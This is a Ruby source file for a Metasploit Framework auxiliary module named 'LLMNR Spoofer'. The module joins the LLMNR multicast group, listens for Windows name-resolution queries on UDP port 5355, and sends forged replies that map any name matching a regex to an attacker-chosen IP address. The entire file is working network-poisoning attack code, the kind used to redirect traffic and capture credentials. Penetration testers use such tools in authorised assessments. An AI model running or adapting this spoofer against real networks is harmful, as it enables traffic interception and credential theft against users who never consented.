##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'socket'
require 'ipaddr'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture

	def initialize
		super(
			'Name'           => 'LLMNR Spoofer',
			'Description'    => %q{
					LLMNR (Link-local Multicast Name Resolution) is the successor of NetBIOS (Windows Vista and up) and is used to
					resolve the names of neighboring computers. This module forges LLMNR responses by listening for LLMNR requests
					sent to the LLMNR multicast address (224.0.0.252) and responding with a user-defined spoofed IP address.
			},
			'Author'     => [ 'Robin Francois <rof[at]navixia.com>' ],
			'License'    => MSF_LICENSE,
			'Version'    => '$Revision$',
			'References' =>
				[
					[ 'URL', 'http://www.ietf.org/rfc/rfc4795.txt' ]
				],
			'Actions'		=>
				[
					[ 'Service' ]
				],
			'PassiveActions' =>
				[
					'Service'
				],
			'DefaultAction'  => 'Service'
		)

		register_options([
			OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", ""]),
			OptAddress.new('SRVHOST', [ false, "IP address of INTERFACE", "0.0.0.0"]),
			OptString.new('REGEX', [ true, "Regex applied to the LLMNR Name to determine if spoofed reply is sent", '.*']),
		])

		register_advanced_options([
			OptBool.new('Debug', [ false, "Determines whether incoming packet parsing is displayed", false])
		])

		deregister_options('RHOST', 'PCAPFILE', 'SNAPLEN', 'FILTER')
	end

	def run
		check_pcaprub_loaded()
		::Socket.do_not_reverse_lookup = true

		multicast_addr = "224.0.0.252" #Multicast Address for LLMNR
		local_ip = ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST'])
		if datastore['DEBUG']
			print_status("Private IP:        #{local_ip}")
		end

		ip = ::IPAddr.new(multicast_addr).hton + ::IPAddr.new(local_ip).hton
		@sock = ::UDPSocket.new()
		@sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
		@sock.setsockopt(::Socket::IPPROTO_IP, ::Socket::IP_ADD_MEMBERSHIP, ip) #Multicast Join
		@sock.bind("0.0.0.0", 5355)

		@run = true

		print_status("LLMNR Spoofer started. Listening for LLMNR requests...")

		begin

		while @run
			packet, addr = @sock.recvfrom(128)
			vprint_status("Packet received from #{addr[3]}")

			rhost = addr[3]
			src_port = addr[1]
			break if packet.length == 0

			# Getting info from the request packet
			llmnr_transid      = packet[0..1]
			llmnr_flags        = packet[2..3]
			llmnr_questions    = packet[4..5]
			llmnr_answerrr     = packet[6..7]
			llmnr_authorityrr  = packet[8..9]
			llmnr_additionalrr = packet[10..11]
			llmnr_name_length  = packet[12..12]
			name_end =  13 + llmnr_name_length.unpack('C')[0].to_int
			llmnr_name = packet[13..name_end-1]
			llmnr_name_and_length = packet[12..name_end]
			llmnr_type = packet[name_end+1..name_end+2]
			llmnr_class = packet[name_end+3..name_end+4]

			llmnr_decodedname = llmnr_name.unpack('a*')[0].to_s

			if datastore['DEBUG']
				print_status("transid:        #{llmnr_transid.unpack('H4')}")
				print_status("tlags:          #{llmnr_flags.unpack('B16')}")
				print_status("questions:      #{llmnr_questions.unpack('n')}")
				print_status("answerrr:       #{llmnr_answerrr.unpack('n')}")
				print_status("authorityrr:    #{llmnr_authorityrr.unpack('n')}")
				print_status("additionalrr:   #{llmnr_additionalrr.unpack('n')}")
				print_status("name length:    #{llmnr_name_length.unpack('c')}")
				print_status("name:           #{llmnr_name.unpack('a*')}")
				print_status("decodedname:    #{llmnr_decodedname}")
				print_status("type:           #{llmnr_type.unpack('n')}")
				print_status("class:          #{llmnr_class.unpack('n')}")
			end


			if (llmnr_decodedname =~ /#{datastore['REGEX']}/i)

				vprint_status("Regex matched #{llmnr_decodedname} from #{rhost}. Sending reply...")

				#Header
				response =  llmnr_transid
				response << "\x80\x00" # Flags TODO add details
				response << "\x00\x01" # Questions = 1
				response << "\x00\x01" # Answer RRs = 1
				response << "\x00\x00" # Authority RRs = 0
				response << "\x00\x00" # Additional RRs = 0
				#Query part
				response << llmnr_name_and_length
				response << llmnr_type
				response << llmnr_class
				#Answer part
				response << llmnr_name_and_length
				response << llmnr_type
				response << llmnr_class
				response << "\x00\x04\x93\xe0" # TTL
				response << "\x00\x04" # Datalength = 4
				response << datastore['SPOOFIP'].split('.').collect(&:to_i).pack('C*')

				open_pcap
					# Sending UDP unicast response
					p = PacketFu::UDPPacket.new
					p.ip_saddr = Rex::Socket.source_address(rhost)
					p.ip_daddr = rhost
					p.ip_ttl = 255
					p.udp_sport = 5355 # LLMNR UDP port
					p.udp_dport = src_port  # Port used by sender
					p.payload = response
					p.recalc

					capture_sendto(p, rhost,true)
					vprint_good("Reply for #{llmnr_decodedname} sent to #{rhost} with spoofed IP #{datastore['SPOOFIP']}...")
				close_pcap

			else
				vprint_status("Packet received from #{rhost} with name #{llmnr_decodedname} did not match regex")
			end
		end

		rescue ::Exception => e
			print_error("llmnr: #{e.class} #{e} #{e.backtrace}")
		# Make sure the socket gets closed on exit
		ensure
			@sock.close
		end
	end
end
